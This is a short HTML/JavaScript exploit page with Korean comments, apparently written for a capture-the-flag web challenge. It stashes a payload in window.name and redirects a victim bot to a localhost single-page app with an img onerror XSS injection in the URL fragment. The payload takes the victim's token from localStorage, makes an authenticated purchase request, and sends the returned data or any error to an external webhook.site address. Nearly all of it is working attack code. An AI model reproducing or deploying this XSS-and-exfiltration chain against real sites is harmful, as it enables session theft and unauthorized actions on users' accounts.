<script>
    // 1. 봇이 실행할 실제 공격 코드 (플래그 구매 및 전송)
    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12"; // Webhook.site 주소
    const payload = `
        fetch('/4/buy', {
            method: 'POST',
            headers: { 'token': localStorage.getItem('token') }
        })
        .then(r => r.json())
        .then(d => fetch('${webhook}?flag=' + d.data))
        .catch(e => fetch('${webhook}?error=' + e));
    `;

    // 2. window.name에 페이로드 저장 (도메인이 바뀌어도 유지됨)
    window.name = payload;

    // 3. 다시 localhost의 XSS 취약 지점으로 리다이렉트
    // SPA 특성상 URL의 # 뒤에 오는 값을 검증 없이 화면에 그리는 경우가 많습니다.
    // 아래 경로는 일반적인 SPA의 XSS 패턴입니다.
    location.href = "http://localhost:3000/#/item/<img src=x onerror=eval(window.name)>";
</script>
